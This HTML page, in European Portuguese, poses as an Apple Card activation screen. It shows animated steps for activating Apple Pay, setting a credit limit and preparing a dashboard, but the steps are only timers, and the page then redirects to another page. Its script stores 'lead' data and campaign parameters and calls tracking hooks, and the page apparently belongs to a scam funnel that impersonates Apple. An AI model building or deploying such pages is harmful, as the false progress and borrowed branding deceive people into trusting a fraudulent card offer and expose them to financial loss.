<!DOCTYPE html>
<html lang="pt-PT">
<head>
<script src="tracker.js"></script>
<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>A configurar... — Apple Card</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
        :root{--apple-black:#1D1D1F;--apple-blue:#0071E3;--success:#34C759}
        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:var(--apple-black);color:#fff;-webkit-font-smoothing:antialiased;overflow:hidden;height:100vh;height:100dvh;display:flex;align-items:center;justify-content:center}
        .page{max-width:520px;width:100%;text-align:center;padding:40px 24px;position:relative}

        /* Glowing orbs */
        .orb{position:fixed;border-radius:50%;filter:blur(80px);opacity:0.12;pointer-events:none}
        .orb-1{width:300px;height:300px;background:var(--apple-blue);top:-80px;left:-80px;animation:orbMove1 12s ease infinite}
        .orb-2{width:250px;height:250px;background:var(--success);bottom:-60px;right:-60px;animation:orbMove2 14s ease infinite}

        /* Apple logo */
        .logo-wrap{width:80px;height:80px;margin:0 auto 32px;position:relative}
        .logo-ring{position:absolute;inset:-8px;border:2px solid rgba(255,255,255,0.1);border-radius:50%;animation:ringPulse 3s ease infinite}
        .logo-ring-2{position:absolute;inset:-16px;border:1px solid rgba(255,255,255,0.05);border-radius:50%;animation:ringPulse 3s ease 0.5s infinite}
        .logo-inner{width:80px;height:80px;border-radius:50%;background:rgba(255,255,255,0.05);display:flex;align-items:center;justify-content:center}
        .logo-inner img{width:32px;height:40px;animation:logoBreathe 3s ease infinite}

        /* Steps */
        .steps{display:flex;flex-direction:column;gap:14px;max-width:280px;margin:0 auto 32px}
        .step{display:flex;align-items:center;gap:12px;font-size:0.875rem;color:rgba(255,255,255,0.3);transition:all 0.5s ease}
        .step.active{color:rgba(255,255,255,0.9)}
        .step.done{color:var(--success)}
        .step-icon{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;border:1.5px solid rgba(255,255,255,0.1);transition:all 0.5s ease}
        .step.active .step-icon{border-color:var(--apple-blue);background:rgba(0,113,227,0.1)}
        .step.done .step-icon{border-color:var(--success);background:rgba(52,199,89,0.1)}
        .step-icon .spinner{width:14px;height:14px;border:2px solid rgba(255,255,255,0.1);border-top-color:var(--apple-blue);border-radius:50%;animation:spin 0.7s linear infinite;display:none}
        .step.active .spinner{display:block}
        .step-icon .check{display:none}
        .step.done .check{display:block}
        .step.done .spinner{display:none}
        .step-icon .check svg{width:14px;height:14px;fill:var(--success)}
        .step-icon .num{font-size:0.6875rem;font-weight:600;display:block}
        .step.active .num,.step.done .num{display:none}

        /* Progress */
        .progress-track{width:100%;height:4px;background:rgba(255,255,255,0.08);border-radius:2px;overflow:hidden;margin-bottom:12px}
        .progress-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--apple-blue),var(--success));border-radius:2px;transition:width 0.8s ease}

        .status-text{font-size:0.75rem;color:rgba(255,255,255,0.4);letter-spacing:0.02em}

        @keyframes spin{to{transform:rotate(360deg)}}
        @keyframes orbMove1{0%,100%{transform:translate(0,0)}50%{transform:translate(30px,40px)}}
        @keyframes orbMove2{0%,100%{transform:translate(0,0)}50%{transform:translate(-20px,-30px)}}
        @keyframes ringPulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.3;transform:scale(1.1)}}
        @keyframes logoBreathe{0%,100%{opacity:0.9;transform:scale(1)}50%{opacity:0.6;transform:scale(0.95)}}
    </style>
</head>
<body>
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>

    <div class="page">
        <div class="logo-wrap">
            <div class="logo-ring"></div>
            <div class="logo-ring-2"></div>
            <div class="logo-inner">
                <img src="assets/images/white.svg" alt="" style="width:40px;height:48px">
            </div>
        </div>

        <div class="steps">
            <div class="step" id="s1"><div class="step-icon"><div class="spinner"></div><div class="check"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div><span class="num">1</span></div><span>A ativar Apple Pay Wallet...</span></div>
            <div class="step" id="s2"><div class="step-icon"><div class="spinner"></div><div class="check"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div><span class="num">2</span></div><span>A configurar limite de crédito...</span></div>
            <div class="step" id="s3"><div class="step-icon"><div class="spinner"></div><div class="check"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div><span class="num">3</span></div><span>A personalizar o seu cartão...</span></div>
            <div class="step" id="s4"><div class="step-icon"><div class="spinner"></div><div class="check"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div><span class="num">4</span></div><span>A preparar Dashboard...</span></div>
            <div class="step" id="s5"><div class="step-icon"><div class="spinner"></div><div class="check"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div><span class="num">5</span></div><span>A finalizar ativação...</span></div>
        </div>

        <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
        <div class="status-text" id="statusText">A iniciar...</div>
    </div>

    <script>
        (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v);});})();
        const LeadData={_key:'applecard_lead',load(){try{return JSON.parse(localStorage.getItem(this._key)||'{}')}catch{return{}}},update(d){const c=this.load();const u={...c,...d,updated_at:Date.now()};localStorage.setItem(this._key,JSON.stringify(u));return u}};
        function buildUrl(b,e={}){const u=new URL(b,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>u.searchParams.set(k,v));Object.entries(e).forEach(([k,v])=>{if(v)u.searchParams.set(k,v)});return u.toString()}

        LeadData.update({ page: 'configurando' });
        if (window.track) window.track('AccountConfiguring', { content_id: 'apple-card-pt' });
        if (window.identifyUser) window.identifyUser();

        const timings = [
            {id:'s1', duration:1800, progress:20, text:'A ativar Apple Pay...'},
            {id:'s2', duration:1500, progress:40, text:'A configurar limite...'},
            {id:'s3', duration:1700, progress:60, text:'A personalizar cartão...'},
            {id:'s4', duration:2000, progress:80, text:'A preparar Dashboard...'},
            {id:'s5', duration:1200, progress:100, text:'Quase pronto!'}
        ];

        let current = 0;
        function runStep(){
            if(current >= timings.length){
                document.getElementById('statusText').textContent = 'Conta ativada com sucesso!';
                setTimeout(()=>{
                    window.location.href = buildUrl('dashboard.html');
                }, 800);
                return;
            }
            const step = timings[current];
            const el = document.getElementById(step.id);
            el.classList.add('active');
            document.getElementById('progressFill').style.width = step.progress + '%';
            document.getElementById('statusText').textContent = step.text;

            setTimeout(()=>{
                el.classList.remove('active');
                el.classList.add('done');
                current++;
                runStep();
            }, step.duration);
        }

        setTimeout(runStep, 600);
    </script>
</body>
</html>
